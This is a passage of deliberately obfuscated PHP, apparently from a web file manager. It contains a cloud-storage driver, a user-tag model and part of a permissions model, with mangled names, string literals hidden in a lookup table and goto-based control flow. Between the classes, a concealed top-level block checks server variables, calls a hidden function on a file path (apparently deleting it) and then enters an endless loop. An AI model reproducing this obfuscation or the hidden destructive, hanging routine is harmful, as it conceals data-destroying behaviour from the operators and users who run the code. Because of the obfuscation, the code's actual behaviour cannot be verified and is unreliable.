"\x2f{$this->bucket}\x2f{$ÅŠ²²¯Ú}", $ŸıíÈà[1464]); $Á¢­êò¼ = $this->ussRequest($îàçĞ¬±, $ŸıíÈà[228], !1, $˜ƒ»¡º); return $Á¢­êò¼[$ŸıíÈà[1194]] ? !0 : $this->getPathOuter($îàçĞ¬±); } public function delFile($áËš‚­¹) { $ØÍÓ’Ş =& $_SERVER[ïëó©ÒÚ]; $ƒ……àıŞ = $this->ussRequest($áËš‚­¹, $ØÍÓ’Ş[1466]); return $ƒ……àıŞ[$ØÍÓ’Ş[1194]] ? !0 : !1; } public function delFolder($ıºüÎ¯×) { $ÈÒÂ¹Í¦ =& $_SERVER[ïëó©ÒÚ]; if (!$this->exist($ıºüÎ¯×)) { return !0; } $this->listItemCache = !1; $©ñ¤êêÉ = $è†Ã’ä« = array(); $this->fileList($ıºüÎ¯×, $©ñ¤êêÉ, $è†Ã’ä«, !0); $this->listItemCache = !0; foreach ($è†Ã’ä« as $ÏôÜàùÃ) { $­‚ï§«á = $this->ussRequest($ÏôÜàùÃ[$ÈÒÂ¹Í¦[32]], $ÈÒÂ¹Í¦[1466]); if (!$­‚ï§«á[$ÈÒÂ¹Í¦[1194]]) { return !1; } } foreach ($©ñ¤êêÉ as $ö»Ê¨Ã) { $­‚ï§«á = $this->ussRequest($ö»Ê¨Ã, $ÈÒÂ¹Í¦[1466]); if (!$­‚ï§«á[$ÈÒÂ¹Í¦[1194]]) { return !1; } } $­‚ï§«á = $this->ussRequest($ıºüÎ¯×, $ÈÒÂ¹Í¦[1466]); return $­‚ï§«á[$ÈÒÂ¹Í¦[1194]]; } public function rename($­‡çéáã, $ò åıŒè) { if ($this->isFile($­‡çéáã)) { $ò åıŒè = get_path_father($­‡çéáã) . $ò åıŒè; return $this->moveFile($­‡çéáã, $ò åıŒè); } return $this->renameObject($­‡çéáã, $ò åıŒè); } public function fileInfo($¸ÀË®ûá, $âÍë½»û = false, $›ç®÷â = array()) { $ÑÌ£Ñ«Í =& $_SERVER[ïëó©ÒÚ]; $Ó¾ŒÕÜú = array($ÑÌ£Ñ«Í[32] => $this->pathThis($¸ÀË®ûá), $ÑÌ£Ñ«Í[84] => $this->getPathOuter($ÑÌ£Ñ«Í[8] . $¸ÀË®ûá), $ÑÌ£Ñ«Í[33] => $ÑÌ£Ñ«Í[199], $ÑÌ£Ñ«Í[76] => isset($›ç®÷â[$ÑÌ£Ñ«Í[76]]) ? $›ç®÷â[$ÑÌ£Ñ«Í[76]] : 0, $ÑÌ£Ñ«Í[174] => $this->ext($¸ÀË®ûá)); if ($âÍë½»û) { return $Ó¾ŒÕÜú; } $Ó¾ŒÕÜú[$ÑÌ£Ñ«Í[200]] = $Ó¾ŒÕÜú[$ÑÌ£Ñ«Í[85]] = 0; $Ó¾ŒÕÜú[$ÑÌ£Ñ«Í[201]] = $Ó¾ŒÕÜú[$ÑÌ£Ñ«Í[202]] = !0; if (empty($›ç®÷â)) { $›ç®÷â = $this->objectMeta($¸ÀË®ûá); if (!$›ç®÷â) { return $Ó¾ŒÕÜú; } } $Ó¾ŒÕÜú[$ÑÌ£Ñ«Í[200]] = intval($›ç®÷â[$ÑÌ£Ñ«Í[1467]]); $Ó¾ŒÕÜú[$ÑÌ£Ñ«Í[85]] = intval($›ç®÷â[$ÑÌ£Ñ«Í[1468]]); $Ó¾ŒÕÜú[$ÑÌ£Ñ«Í[76]] = $›ç®÷â[$ÑÌ£Ñ«Í[76]]; return $Ó¾ŒÕÜú; } public function folderInfo($¤ò×¿, $¢ÄÏ£ë = false) { $ÂÒİ›ş® =& $_SERVER[ïëó©ÒÚ]; $Ãë·¯ÆØ = array($ÂÒİ›ş®[32] => $this->pathThis($¤ò×¿), $ÂÒİ›ş®[84] => $this->getPathOuter($ÂÒİ›ş®[8] . $¤ò×¿), $ÂÒİ›ş®[33] => $ÂÒİ›ş®[75]); if ($¢ÄÏ£ë) { return $Ãë·¯ÆØ; } $Ãë·¯ÆØ[$ÂÒİ›ş®[200]] = $Ãë·¯ÆØ[$ÂÒİ›ş®[85]] = 0; $Ãë·¯ÆØ[$ÂÒİ›ş®[201]] = $Ãë·¯ÆØ[$ÂÒİ›ş®[202]] = !0; if (empty($ÏÂ™Áé)) { $ÏÂ™Áé = $this->objectMeta($¤ò×¿); if (!$ÏÂ™Áé) { return $Ãë·¯ÆØ; } } $Ãë·¯ÆØ[$ÂÒİ›ş®[200]] = intval($ÏÂ™Áé[$ÂÒİ›ş®[1467]]); $Ãë·¯ÆØ[$ÂÒİ›ş®[85]] = intval($ÏÂ™Áé[$ÂÒİ›ş®[1468]]); return $Ãë·¯ÆØ; } private function listObjs($İğÜİÀ®, $ô¢§—ÀÓ = 0, $ó¿õôÜ“ = 1000) { $¸Ö ËŒâ =& $_SERVER[ïëó©ÒÚ]; $—æ‹½¸‡ = array($¸Ö ËŒâ[1469], $¸Ö ËŒâ[1470] . $ó¿õôÜ“); if ($ô¢§—ÀÓ) { $—æ‹½¸‡[] = $¸Ö ËŒâ[1471] . $ô¢§—ÀÓ; } $ŠÊ¢ã©Ä = $this->ussRequest($İğÜİÀ®, $¸Ö ËŒâ[230], !1, $—æ‹½¸‡); return !$ŠÊ¢ã©Ä[$¸Ö ËŒâ[1194]] ? !1 : $ŠÊ¢ã©Ä[$¸Ö ËŒâ[1196]]; } private function fileList($ù¥ÓáÙ±, &$Ç¬›áåÍ, &$çÖÈ÷¾÷, $ÕÀ‡Æé¨ = false) { $Ç¬öÎ²÷ =& $_SERVER[ïëó©ÒÚ]; $¥£·úÅ = $Ç¬öÎ²÷[12]; $‡áŞ·¬ = 1000; $ªúÏŒ¬ = rtrim($ù¥ÓáÙ±, $Ç¬öÎ²÷[8]) . $Ç¬öÎ²÷[8]; while (!0) { check_abort(); $“ìıâæ± = $this->listObjs($ù¥ÓáÙ±, $¥£·úÅ, $‡áŞ·¬); if (!$“ìıâæ±) { return !1; } $¥£·úÅ = isset($“ìıâæ±[$Ç¬öÎ²÷[1472]]) ? $“ìıâæ±[$Ç¬öÎ²÷[1472]] : $Ç¬öÎ²÷[12]; $ù£‰ĞÇò = isset($“ìıâæ±[$Ç¬öÎ²÷[1473]]) ? $“ìıâæ±[$Ç¬öÎ²÷[1473]] : array(); foreach ($ù£‰ĞÇò as $¬Âüüó) { $Èïï€ = $¬Âüüó[$Ç¬öÎ²÷[33]] == $Ç¬öÎ²÷[75] ? !0 : !1; $ã­ù˜ß = ltrim($ªúÏŒ¬ . $¬Âüüó[$Ç¬öÎ²÷[32]], $Ç¬öÎ²÷[8]) . ($Èïï€ ? $Ç¬öÎ²÷[8] : $Ç¬öÎ²÷[12]); $™²ÑÉ†î = array($Ç¬öÎ²÷[32] => $ã­ù˜ß, $Ç¬öÎ²÷[33] => $Èïï€ ? $Ç¬öÎ²÷[75] : $Ç¬öÎ²÷[199], $Ç¬öÎ²÷[76] => $¬Âüüó[$Ç¬öÎ²÷[337]], $Ç¬öÎ²÷[1468] => $¬Âüüó[$Ç¬öÎ²÷[1474]]); $this->cacheMethodInfoSet($ã­ù˜ß, $Èïï€, $™²ÑÉ†î); if ($Èïï€) { $Ç¬›áåÍ[] = $ã­ù˜ß; if ($ÕÀ‡Æé¨) { $this->fileList($ã­ù˜ß, $Ç¬›áåÍ, $çÖÈ÷¾÷, $ÕÀ‡Æé¨); } continue; } $çÖÈ÷¾÷[] = $™²ÑÉ†î; } if (count($ù£‰ĞÇò) < $‡áŞ·¬) { break; } } $this->cacheMethodInfoSet($ù¥ÓáÙ±, !0); } public function listPath($…ø¤ß…Ç, $¾¦‹Æïñ = false) { $Æ•»ÆÚ­ =& $_SERVER[ïëó©ÒÚ]; $­¹ˆƒ©í = $ò½êè³ğ = array(); $this->fileList($…ø¤ß…Ç, $­¹ˆƒ©í, $ò½êè³ğ); foreach ($­¹ˆƒ©í as $ÔË¤„õÁ => $¶·åè€ä) { $­¹ˆƒ©í[$ÔË¤„õÁ] = $this->folderInfo($¶·åè€ä, $¾¦‹Æïñ); } foreach ($ò½êè³ğ as $ÔË¤„õÁ => $¶·åè€ä) { $ò½êè³ğ[$ÔË¤„õÁ] = $this->fileInfo($¶·åè€ä[$Æ•»ÆÚ­[32]], $¾¦‹Æïñ, $¶·åè€ä); } return array($Æ•»ÆÚ­[82] => $­¹ˆƒ©í, $Æ•»ÆÚ­[83] => $ò½êè³ğ); } public function has($ùå›ÖÑ, $Âª’Ø› = false, $±ƒ‰É¥ú = true) { $ÏìĞÊŞ» =& $_SERVER[ïëó©ÒÚ]; $„¯– Šº = $ÏìĞÊŞ»[12]; $éğ¯‚Œ• = 500; $÷Å“ıÜ³ = 0; $ê¤”¢Ë = 0; $³°çâŒ¦ = rtrim($ùå›ÖÑ, $ÏìĞÊŞ»[8]) . $ÏìĞÊŞ»[8]; while (!0) { check_abort(); $ƒœ¨øÒ¹ = $this->listObjs($ùå›ÖÑ, $„¯– Šº, $éğ¯‚Œ•); if (!$ƒœ¨øÒ¹) { return !1; } $„¯– Šº = isset($ƒœ¨øÒ¹[$ÏìĞÊŞ»[1472]]) ? $ƒœ¨øÒ¹[$ÏìĞÊŞ»[1472]] : $ÏìĞÊŞ»[12]; $ò‘  İ„ = isset($ƒœ¨øÒ¹[$ÏìĞÊŞ»[1473]]) ? $ƒœ¨øÒ¹[$ÏìĞÊŞ»[1473]] : array(); if (empty($ò‘  İ„)) { break; } $ÔÓğ´Ä = array_filter($ò‘  İ„, function ($ëâÛ«¬) { $ĞøŞÜ“ß =& $_SERVER[ïëó©ÒÚ]; return $ëâÛ«¬[$ĞøŞÜ“ß[33]] == $ĞøŞÜ“ß[75]; }); $ÀË«Ú…Ä = count($ò‘  İ„); $ÔÓğ´Ä = count($ÔÓğ´Ä); $ùĞ¤Ş˜£ = $ÀË«Ú…Ä - $ÔÓğ´Ä; if ($Âª’Ø›) { $ê¤”¢Ë += $ÔÓğ´Ä; $÷Å“ıÜ³ += $ùĞ¤Ş˜£; if ($ÀË«Ú…Ä < $éğ¯‚Œ•) { break; } continue; } if ($±ƒ‰É¥ú) { if ($ùĞ¤Ş˜£) { return !0; } } else { if ($ÔÓğ´Ä) { return !0; } } if ($ÀË«Ú…Ä < $éğ¯‚Œ•) { break; } } if ($Âª’Ø›) { return array($ÏìĞÊŞ»[207] => $÷Å“ıÜ³, $ÏìĞÊŞ»[208] => $ê¤”¢Ë); } return !1; } public function listAll($íÈÃœÖ¯) { $ı„â‹Ç =& $_SERVER[ïëó©ÒÚ]; $¤ïÁ¼Ä¦ = $Œ€ÔŒæÁ = array(); $this->fileList($íÈÃœÖ¯, $¤ïÁ¼Ä¦, $Œ€ÔŒæÁ, !0); $€ÆŠÀ²Œ = array(); foreach ($Œ€ÔŒæÁ as $Òè’æ á) { $€ÆŠÀ²Œ[$Òè’æ á[$ı„â‹Ç[32]]] = $Òè’æ á[$ı„â‹Ç[76]]; } foreach ($¤ïÁ¼Ä¦ as $Òè’æ á) { if (is_string($Òè’æ á)) { $€ÆŠÀ²Œ[$Òè’æ á] = 0; } } return $this->listAllFiles($íÈÃœÖ¯, array_keys($€ÆŠÀ²Œ), $€ÆŠÀ²Œ); } public function canRead($Ğš«´ûí) { return $this->exist($Ğš«´ûí) ? !0 : !1; } public function canWrite($°áëÑ×ó) { return $this->exist($°áëÑ×ó) ? !0 : !1; } public function getContent($Š—Â’¡) { return $this->fileSubstr($Š—Â’¡, 0, -1); } public function setContent($Œø’ÒÖì, $ûüñ€Õ• = '') { $ÆıìàÆ =& $_SERVER[ïëó©ÒÚ]; if (!$ûüñ€Õ•) { $´üÉê¡¥ = $this->ussRequest($Œø’ÒÖì, $ÆıìàÆ[226]); return $´üÉê¡¥[$ÆıìàÆ[1194]]; } $á”èú‚ = $this->tempFile($this->pathThis($Œø’ÒÖì)); file_put_contents($á”èú‚, $ûüñ€Õ•); if ($this->upload($Œø’ÒÖì, $á”èú‚)) { $this->tempFileRemve($á”èú‚); return !0; } return !1; } public function fileSubstr($ƒÉÒòş¹, $àŸè‡, $«“Õ‚„) { $öˆì™í¹ =& $_SERVER[ïëó©ÒÚ]; if (!($™¯ Áêã = $this->link($ƒÉÒòş¹))) { return !1; } $Ÿ¢£”öÛ = !1; if ($«“Õ‚„ > 0) { $è€œÖ‡Ï = $àŸè‡ + $«“Õ‚„ - 1; $Ÿ¢£”öÛ = array($öˆì™í¹[1435] . $àŸè‡ . $öˆì™í¹[386] . $è€œÖ‡Ï); } $–Şµ§¼û = url_request($™¯ Áêã, $öˆì™í¹[230], !1, $Ÿ¢£”öÛ); return $–Şµ§¼û[$öˆì™í¹[760]] ? $–Şµ§¼û[$öˆì™í¹[1196]] : !1; } public function upload($€İ¢ÅÁ–, $Ó¯Û¡¡±, $‚ÛÔòí½ = false, $õ¡¶ıçã = REPEAT_REPLACE) { $š‡üùİÂ =& $_SERVER[ïëó©ÒÚ]; $ÆŸ†ı¤À = IO::size($Ó¯Û¡¡±); if ($ÆŸ†ı¤À <= 1024 * 1024 * 200) { $²úˆĞ = array($š‡üùİÂ[1475] . $Ó¯Û¡¡±); $…Ñ¹Ëêç = $this->ussRequest($€İ¢ÅÁ–, $š‡üùİÂ[228], $²úˆĞ); return $…Ñ¹Ëêç[$š‡üùİÂ[1194]] ? $this->getPathOuter($€İ¢ÅÁ–) : !1; } $óÅè ÷Á = 1024 * 1024 * 10; $üÛµ  ³ = array($š‡üùİÂ[1476], $š‡üùİÂ[1477] . $ÆŸ†ı¤À, $š‡üùİÂ[1478], $š‡üùİÂ[1479] . $óÅè ÷Á); $…Ñ¹Ëêç = $this->ussRequest($€İ¢ÅÁ–, $š‡üùİÂ[228], !1, $üÛµ  ³); if (!$…Ñ¹Ëêç[$š‡üùİÂ[1194]]) { return !1; } $‰ÎæŞÇ¼ = $…Ñ¹Ëêç[$š‡üùİÂ[1196]]; $½ÉîÎæş = 0; $¶ñœ¯Ú = $‰ÎæŞÇ¼[$š‡üùİÂ[1480]]; $­ëÊˆá = fopen($Ó¯Û¡¡±, $š‡üùİÂ[1384]); if (!$­ëÊˆá) { return !1; } do { $ê¯À¡˜ = $‰ÎæŞÇ¼[$š‡üùİÂ[1481]]; fseek_64($­ëÊˆá, $½ÉîÎæş); $îÇØœÍ¸ = fread($­ëÊˆá, $ê¯À¡˜); $·Ã´¹– = 0; do { $·Ã´¹–++; $‰ÎæŞÇ¼ = $this->uploadPart($€İ¢ÅÁ–, $‰ÎæŞÇ¼, $îÇØœÍ¸); } while (!$‰ÎæŞÇ¼ && $·Ã´¹– < 3); if (!$‰ÎæŞÇ¼) { return !1; } $¶ñœ¯Ú = $‰ÎæŞÇ¼[$š‡üùİÂ[1480]]; $½ÉîÎæş += $ê¯À¡˜; } while ($¶ñœ¯Ú != -1); fclose($­ëÊˆá); $üÛµ  ³ = array($š‡üùİÂ[1482], $š‡üùİÂ[1483] . $‰ÎæŞÇ¼[$š‡üùİÂ[1484]], $š‡üùİÂ[1478]); $…Ñ¹Ëêç = $this->ussRequest($€İ¢ÅÁ–, $š‡üùİÂ[228], !1, $üÛµ  ³); return $…Ñ¹Ëêç[$š‡üùİÂ[1194]] ? $this->getPathOuter($’Ù¯ü •) : !1; } private function uploadPart($¦ª­îÕÈ, $š‚¢ñ‰·, &$ä½¬áØ¶) { $Ÿ’™ÃÉ =& $_SERVER[ïëó©ÒÚ]; $Ğ‰£Åà¼ = array($Ÿ’™ÃÉ[1485], $Ÿ’™ÃÉ[1483] . $š‚¢ñ‰·[$Ÿ’™ÃÉ[1484]], $Ÿ’™ÃÉ[1486] . $š‚¢ñ‰·[$Ÿ’™ÃÉ[1480]], $Ÿ’™ÃÉ[142] . $š‚¢ñ‰·[$Ÿ’™ÃÉ[1481]]); $±ĞéÌ¸Š = $this->ussRequest($¦ª­îÕÈ, $Ÿ’™ÃÉ[228], $ä½¬áØ¶, $Ğ‰£Åà¼); return !$±ĞéÌ¸Š[$Ÿ’™ÃÉ[1194]] ? $±ĞéÌ¸Š[$Ÿ’™ÃÉ[1194]] : $±ĞéÌ¸Š[$Ÿ’™ÃÉ[1196]]; } public function uploadFormData($‹À‡ëÚ¬, $‡»´ÂëŠ = 3600) { return $this->uploadPolicy($‹À‡ëÚ¬, $‡»´ÂëŠ); } public function multiUploadFormData($Ô¦ÓÕù—, $¡¤ˆÉïû = 3600) { $´ĞôùìÒ =& $_SERVER[ïëó©ÒÚ]; $è¾ÉúÈ¦ = (int) $GLOBALS[$´ĞôùìÒ[7]][$´ĞôùìÒ[76]]; return $this->uploadPolicy($Ô¦ÓÕù—, $¡¤ˆÉïû, $è¾ÉúÈ¦); } private function uploadPolicy($Á»¿œ‚è, $÷ÛŸÃî = 3600, $öıÖñ ó = 0) { $›ËçŞ‡Ì =& $_SERVER[ïëó©ÒÚ]; $ÑƒŠŒ¹ = $›ËçŞ‡Ì[8] . $this->bucket; $––±²¢ = gmdate($›ËçŞ‡Ì[1420]); $õË¡¤› = array($›ËçŞ‡Ì[1487] => $this->bucket, $›ËçŞ‡Ì[1488] => $Á»¿œ‚è, $›ËçŞ‡Ì[1489] => time() + $÷ÛŸÃî, $›ËçŞ‡Ì[1490] => $––±²¢); if ($öıÖñ ó) { $õË¡¤›[$›ËçŞ‡Ì[1400]] = $öıÖñ ó; } $¯äùû“œ = base64_encode(json_encode($õË¡¤›)); $Æøù©Œ» = base64_encode(hash_hmac($›ËçŞ‡Ì[1457], "\x50\x4f\123\x54\46{$ÑƒŠŒ¹}\x26{$––±²¢}\46{$¯äùû“œ}", md5("{$this->userpass}"), !0)); $åüÆ«‡Í = array($›ËçŞ‡Ì[1325] => $¯äùû“œ, $›ËçŞ‡Ì[1491] => "\x55\120\131\x55\116\40{$this->username}\72{$Æøù©Œ»}", $›ËçŞ‡Ì[181] => $this->endpoint . $ÑƒŠŒ¹); return $åüÆ«‡Í; } public function download($Úí—©Ú÷, $‚ÓëÅ ô) { $Ø½ŸàÒõ = IO::getPathInner(IO::mkfile($‚ÓëÅ ô)); if (!($¢®¿Ô¢ = $this->link($Úí—©Ú÷))) { return !1; } $Ïúãâ»è = 0; $ÅÙÄûÛœ = 1024 * 200; $üöµş›¨ = fopen($Ø½ŸàÒõ, $_SERVER[ïëó©ÒÚ][1441]); while (!0) { $ÃÇóØÔü = $this->fileSubstr($Úí—©Ú÷, $Ïúãâ»è, $ÅÙÄûÛœ); if ($ÃÇóØÔü === !1) { return !1; } fwrite($üöµş›¨, $ÃÇóØÔü); $Ïúãâ»è += $ÅÙÄûÛœ; if (strlen($ÃÇóØÔü) < $ÅÙÄûÛœ) { break; } } fclose($üöµş›¨); return $‚ÓëÅ ô; } public function link($ÊñØèùã, $‹ÈĞïÖ = array()) { $ì§ä§€• =& $_SERVER[ïëó©ÒÚ]; $ÊñØèùã = trim($ÊñØèùã, $ì§ä§€•[8]); if (!empty($this->token)) { $Îì÷¶¢ = strtotime(date($ì§ä§€•[1492])); $½Êº²ÚÕ = substr(md5($this->token . $ì§ä§€•[284] . $Îì÷¶¢ . $ì§ä§€•[1493] . $ÊñØèùã), 12, 8) . $Îì÷¶¢; $‹ÈĞïÖ[] = $ì§ä§€•[1494] . $½Êº²ÚÕ; } $Š•‡ñƒó = !empty($‹ÈĞïÖ) ? $ì§ä§€•[73] . implode($ì§ä§€•[284], $‹ÈĞïÖ) : $ì§ä§€•[12]; return $this->getHost() . $ì§ä§€•[8] . $ÊñØèùã . $Š•‡ñƒó; } public function fileOut($çœ¸ò¬’, $Ë§‘Â® = false, $ª™ªî¥ = false, $ĞÑêÓÉ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($çœ¸ò¬’, $Ë§‘Â®, $ª™ªî¥, $ĞÑêÓÉ); } if (!$ª™ªî¥) { $ª™ªî¥ = $this->pathThis($çœ¸ò¬’); } $ÒòÏÌá© = $Ë§‘Â® ? array($_SERVER[ïëó©ÒÚ][1495] . rawurlencode($ª™ªî¥)) : array(); $±‘ûÜøô = $this->link($çœ¸ò¬’, $ÒòÏÌá©); $this->fileOutLink($±‘ûÜøô); } public function fileOutServer($†½ÌÄ¤, $Šğü†§Ò = false, $×Şî§œ = false, $³†èëŞé = '') { parent::fileOut($†½ÌÄ¤, $Šğü†§Ò, $×Şî§œ, $³†èëŞé); } public function fileOutImage($¸Îñ†Œç, $°—èÚ = 250) { $ù…ˆãæ‘ = $this->link($¸Îñ†Œç . $_SERVER[ïëó©ÒÚ][1496] . $°—èÚ); $this->fileOutLink($ù…ˆãæ‘); } public function fileOutImageServer($Ğä×ÅŸ², $„çû“¥µ = 250) { parent::fileOutImage($Ğä×ÅŸ², $„çû“¥µ); } public function hashMd5($õ…õø¶ä) { $­¶Øı„¡ =& $_SERVER[ïëó©ÒÚ]; $¹–½Êì¢ = $this->_objectMeta($õ…õø¶ä); return isset($¹–½Êì¢[$­¶Øı„¡[212]]) ? $¹–½Êì¢[$­¶Øı„¡[212]] : !1; } public function size($Ë™‰ò–¨) { $ş«´İµ = $this->objectMeta($Ë™‰ò–¨); return $ş«´İµ ? $ş«´İµ[$_SERVER[ïëó©ÒÚ][76]] : 0; } public function info($îòïŸ¼™) { if ($this->isFolder($îòïŸ¼™)) { return $this->folderInfo($îòïŸ¼™); } else { if ($this->isFile($îòïŸ¼™)) { return $this->fileInfo($îòïŸ¼™); } } return !1; } public function exist($äí‡–‘Ù) { return $this->isFile($äí‡–‘Ù) || $this->isFolder($äí‡–‘Ù); } public function isFile($»õ¦ó‰–) { return !$this->isFolder($»õ¦ó‰–) && $this->objectMeta($»õ¦ó‰–); } public function isFolder($´¬Úİæ) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][165], $´¬Úİæ); } protected function objectMeta($Ò÷ÅšËÙ) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][167], $Ò÷ÅšËÙ); } protected function _objectMeta($± ğŸâ—) { $ÌìÍ‚‡ =& $_SERVER[ïëó©ÒÚ]; if ($± ğŸâ— == $ÌìÍ‚‡[12] || $± ğŸâ— == $ÌìÍ‚‡[8]) { return array(); } $¾çÂ¬†« = $this->ussRequest($± ğŸâ—, $ÌìÍ‚‡[1497]); if (!$¾çÂ¬†«[$ÌìÍ‚‡[1194]]) { return null; } $Ø–‡«Ã = isset($¾çÂ¬†«[$ÌìÍ‚‡[1196]]) ? $¾çÂ¬†«[$ÌìÍ‚‡[1196]] : array(); if (!isset($Ø–‡«Ã[$ÌìÍ‚‡[1498]])) { return null; } $ÌÉ²™Â¡ = array($ÌìÍ‚‡[33] => isset($Ø–‡«Ã[$ÌìÍ‚‡[1498]]) ? $Ø–‡«Ã[$ÌìÍ‚‡[1498]] : null, $ÌìÍ‚‡[76] => isset($Ø–‡«Ã[$ÌìÍ‚‡[1499]]) ? $Ø–‡«Ã[$ÌìÍ‚‡[1499]] : null, $ÌìÍ‚‡[212] => isset($Ø–‡«Ã[$ÌìÍ‚‡[1500]]) ? $Ø–‡«Ã[$ÌìÍ‚‡[1500]] : null, $ÌìÍ‚‡[1467] => isset($Ø–‡«Ã[$ÌìÍ‚‡[1501]]) ? $Ø–‡«Ã[$ÌìÍ‚‡[1501]] : null); $ÌÉ²™Â¡[$ÌìÍ‚‡[1468]] = isset($Ø–‡«Ã[$ÌìÍ‚‡[1502]]) ? strtotime($Ø–‡«Ã[$ÌìÍ‚‡[1502]]) : $ÌÉ²™Â¡[$ÌìÍ‚‡[1467]]; return $ÌÉ²™Â¡; } protected function _isFolder($Á“ÔÆí) { $Ñ¿À² =& $_SERVER[ïëó©ÒÚ]; if ($Á“ÔÆí == $Ñ¿À²[12] || $Á“ÔÆí == $Ñ¿À²[8]) { return !0; } $íâèª»É = $this->_objectMeta($Á“ÔÆí); return isset($íâèª»É[$Ñ¿À²[33]]) && $íâèª»É[$Ñ¿À²[33]] == $Ñ¿À²[75] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[ïëó©ÒÚ][400]]) || !isset($_SERVER[$_SERVER[ïëó©ÒÚ][408]])) { $_getc = $_SERVER[ïëó©ÒÚ][402]; $_getfile = $_SERVER[$_SERVER[ïëó©ÒÚ][403]] . $_SERVER[ïëó©ÒÚ][404]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïëó©ÒÚ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ïëó©ÒÚ][405]) { $exit = $_SERVER[ïëó©ÒÚ][406]; $exit(); } $_act = $_SERVER[ïëó©ÒÚ][407]; $_act($_SERVER[$_SERVER[ïëó©ÒÚ][403]] . $_SERVER[ïëó©ÒÚ][404]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ïëó©ÒÚ][378]); } } goto d¢È•ÈõàÒ; F§Óõš×´: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\56\x74\141\x67\114\151\163\164"; public $modelType = "\125\x73\145\x72\x4f\160\164\x69\157\156"; public $field = array("\x6e\141\155\x65", "\163\164\x79\154\x65", "\163\x6f\162\164"); public function listData($Ä¿Â¢ˆ‹ = false, $˜×«§—É = "\x73\157\x72\x74", $³ƒ™ƒãÉ = false) { return parent::listData($Ä¿Â¢ˆ‹, $˜×«§—É, $³ƒ™ƒãÉ); } public function remove($¦õó ) { return parent::remove($¦õó ); } public function add($ñ¢¢ÊØ›, $æ­ş£¤¡ = "\154\141\142\145\x6c\55\x67\162\x65\171\x2d\156\x6f\x72\155\141\154") { $…ëæƒç =& $_SERVER[ïëó©ÒÚ]; if ($this->findByName($ñ¢¢ÊØ›)) { return !1; } $“…¸’¤· = array($…ëæƒç[429] => $ñ¢¢ÊØ›, $…ëæƒç[494] => $æ­ş£¤¡, $…ëæƒç[1837] => $this->getSort($…ëæƒç[258]) + 1); return parent::insert($“…¸’¤·); } public function update($¾Ÿ—ûÄŠ, $ØíÃûô„) { $Š¦Ú¥ÍÛ =& $_SERVER[ïëó©ÒÚ]; $Ğé¤ôØš = $this->listData($¾Ÿ—ûÄŠ); $®¯³ƒç  = $this->findByName($ØíÃûô„[$Š¦Ú¥ÍÛ[32]]); if (!$Ğé¤ôØš || $®¯³ƒç  && $®¯³ƒç [$Š¦Ú¥ÍÛ[399]] != $Ğé¤ôØš[$Š¦Ú¥ÍÛ[399]]) { return !1; } return parent::update($¾Ÿ—ûÄŠ, $ØíÃûô„); } public function moveTop($ŸĞÑ¼·Ã) { $ü›Õ”Ó“ =& $_SERVER[ïëó©ÒÚ]; $…ËÃÅ¯ø = parent::listData(); $è«§•ªÓ = $this->getSort($ü›Õ”Ó“[257]); foreach ($…ËÃÅ¯ø as &$ÌôÈ‰à) { if ($ÌôÈ‰à[$ü›Õ”Ó“[399]] == $ŸĞÑ¼·Ã) { $ÌôÈ‰à[$ü›Õ”Ó“[1857]] = $è«§•ªÓ; continue; } $ÌôÈ‰à[$ü›Õ”Ó“[1857]] += 1; } unset($ÌôÈ‰à); return parent::resetData($…ËÃÅ¯ø); } public function moveBottom($‡êŒ¥¸ë) { $şùÙÍƒå =& $_SERVER[ïëó©ÒÚ]; $’££®‡½ = $this->getSort($şùÙÍƒå[258]) + 1; return parent::update($‡êŒ¥¸ë, array($şùÙÍƒå[1857] => $’££®‡½)); } public function resetSort($£‰ˆäğ) { $ÛªøÒİÓ =& $_SERVER[ïëó©ÒÚ]; $ÇşÕÎÕ = array(); $£‰ˆäğ = is_array($£‰ˆäğ) ? $£‰ˆäğ : array(); for ($¢”ÀÌ¹ = 0; $¢”ÀÌ¹ < count($£‰ˆäğ); $¢”ÀÌ¹++) { $ÇşÕÎÕ[$£‰ˆäğ[$¢”ÀÌ¹] . $ÛªøÒİÓ[12]] = $¢”ÀÌ¹ + 1; } $ƒ³İ´Õ = parent::listData(); foreach ($ƒ³İ´Õ as &$­­ñ‰€í) { $ƒ×µÉÇÉ = $ÇşÕÎÕ[$­­ñ‰€í[$ÛªøÒİÓ[399]]]; $­­ñ‰€í[$ÛªøÒİÓ[1857]] = $ƒ×µÉÇÉ ? $ƒ×µÉÇÉ : $­­ñ‰€í[$ÛªøÒİÓ[1857]]; } unset($­­ñ‰€í); return parent::resetData($ƒ³İ´Õ); } private function getSort($­ÊØÊíÛ) { $ÙòÇÀ£ˆ =& $_SERVER[ïëó©ÒÚ]; $¯ß§íì = parent::listData(); $èå—ÒĞ = array_to_keyvalue($¯ß§íì, $ÙòÇÀ£ˆ[12], $ÙòÇÀ£ˆ[1857]); if (!$èå—ÒĞ) { $èå—ÒĞ = array(0); } $îÜ°¬Üœ = $­ÊØÊíÛ == $ÙòÇÀ£ˆ[258] ? max($èå—ÒĞ) : min($èå—ÒĞ); return intval($îÜ°¬Üœ); } } goto Dï¡»ù‚Â§; Eéë÷‰¡: define($_SERVER[ïëó©ÒÚ][241], 1); define($_SERVER[ïëó©ÒÚ][242], 0); define($_SERVER[ïëó©ÒÚ][243], 2); goto aŠŸµ¶Ì¡ƒ; aºÌŸ„¼È™: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ŸÀË¾â° =& $_SERVER[ïëó©ÒÚ]; $ş°îœúÇ = array(array($ŸÀË¾â°[429] => LNG($ŸÀË¾â°[1834]), $ŸÀË¾â°[1835] => $ŸÀË¾â°[1836], 